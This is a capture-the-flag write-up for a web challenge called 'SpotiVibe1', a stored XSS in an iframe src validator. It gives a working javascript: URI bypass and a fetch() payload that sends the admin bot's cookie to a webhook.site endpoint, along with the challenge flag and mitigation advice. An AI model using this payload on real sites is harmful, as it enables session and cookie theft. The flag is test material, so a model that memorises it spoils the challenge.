# k1nd4sus_2026

# SpotiVibe1

## Web: XSS

## Description
Now that Spotify has made their app uncrackable i decided to build my own personal version with the help of good old AI. It's all so fantastic!!!

http://chall.k1nd4sus.it:30502

## Files
> This challenge provides the source code of the web application.

---

## Analysis

We can see a web app that renders iframes when a song is submitted via **/add_song**. However, you can't just paste any URL — it must pass the following Python validation:

```python
def is_valid_spotify_url(url):
    try:
        decoded = unquote(url)
        parsed = urlparse(decoded)

        if parsed.hostname != "open.spotify.com":
            return False

        if not parsed.path.startswith("/embed/"):
            return False

        if '"' in decoded:
            return False

        return True
```

Once a valid URL is submitted, the app displays song metadata and renders the iframe:

![Song iframe rendered in the app]<img width="1083" height="791" alt="cancion" src="https://github.com/user-attachments/assets/302d7c54-e9c5-444e-972c-e1f30114479e" />


Inspecting the page source confirms this is **stored XSS** — and there's also an admin bot, which means we have a target to steal cookies from:

```html
<h2>Housito</h2>

<div style="display:flex; justify-content:center; margin-top:30px;">

<iframe 
    src="https://open.spotify.com/embed/track/2WCEzJ2pXmk5Wf6uZEk4ds"
    width="400"
    height="380"
    frameborder="0"
    allowtransparency="true"
    allow="encrypted-media">
</iframe>
```

Our goal: escape the `src` attribute and execute arbitrary JavaScript.

---

## Theory

To solve this challenge, you need to understand:

- **XSS (Cross-Site Scripting)**: How stored user input gets reflected into HTML without proper sanitization, enabling script injection.
- **JavaScript URI scheme**: Using `javascript:` as a URL scheme to execute code in the browser context.
- **URL Encoding / Escape Sequences**: Using percent-encoded characters like `%0a` (newline) to break out of URL parsing constraints.
- **Blocklist Bypass**: Working around character restrictions (`"`, `<`, `>`, `'`) by using alternative syntax such as backtick template literals.
- **Cookie Theft via Fetch**: Exfiltrating `document.cookie` to an attacker-controlled endpoint when `httpOnly` is `false`.
- **CSP & SOP Awareness**: Understanding how browser security policies may restrict script execution and cross-origin requests.
- **Patience**: Systematically testing and iterating payloads until one works.

---

## Solution

### Step 1: Escape the `src` attribute

The goal is to inject JavaScript into the `src` of the iframe. After testing several approaches (including `data:text/javascript`), the most effective bypass was using the `javascript:` URI scheme combined with `%0a` (URL-encoded newline) to break out of the URL path validation:

```
javascript://open.spotify.com/embed/%0aalert(1)
```

The validator sees `open.spotify.com` as the hostname and `/embed/` as the path start — both pass. But the browser interprets `javascript:` as a script URI and executes `alert(1)` after the newline.

### Step 2: Steal the admin cookie

The template engine escapes standard quote characters (`"`, `'`, `<`, `>`), so we need backtick template literals (`` ` ``) instead of quotes to build strings.

Checking the source, the cookie is accessible:

```python
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "path": "/",
    "httpOnly": False
})
```

`httpOnly: False` means the cookie is readable via `document.cookie`. The final payload:

```
javascript://open.spotify.com/embed/%0afetch(`https://webhook.site/mi_id121?cook=` + document.cookie)
```

This passes validation, gets stored, and when the admin bot visits the page, it fires a request to our webhook with the cookie attached:

```
GET https://webhook.site/26ddafae-d26f-40a6-9d00-edfb731e1040?cook=flag=KSUS{4b4eba6646f7903fd437d6fbf1b5783d}
Host      81.56.204.152
Location  🇮🇹 Milan, Lombardia, Italy
Date      04/18/2026 2:27:01 PM
```

**MACHINE PWNED!** :)

---

## Flag
> **KSUS{4b4eba6646f7903fd437d6fbf1b5783d}**

---

## How to avoid

### 1. **Use an allowlist for URL schemes**
Reject anything that isn't `https://`. A blocklist (banning `"`, `<`, `>`) is trivially bypassed with backticks or encoding.

```python
from urllib.parse import urlparse, unquote

def is_valid_spotify_url(url):
    decoded = unquote(url)
    parsed = urlparse(decoded)

    if parsed.scheme != "https":          # Block javascript:, data:, etc.
        return False
    if parsed.hostname != "open.spotify.com":
        return False
    if not parsed.path.startswith("/embed/"):
        return False

    return True
```

### 2. **Sanitize on output, not just on input**
When inserting user-supplied URLs into HTML attributes, always HTML-encode the value:

```python
from markupsafe import escape
src = escape(user_url)  # Renders javascript: harmless in attribute context
```

### 3. **Set a strict Content Security Policy**
Add a CSP header to block inline script execution and restrict `fetch` targets:

```
Content-Security-Policy: default-src 'self'; frame-src https://open.spotify.com; script-src 'none'
```

### 4. **Mark session cookies as `httpOnly: True`**
If the cookie had been `httpOnly`, `document.cookie` would not expose it, making exfiltration impossible even with XSS execution.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
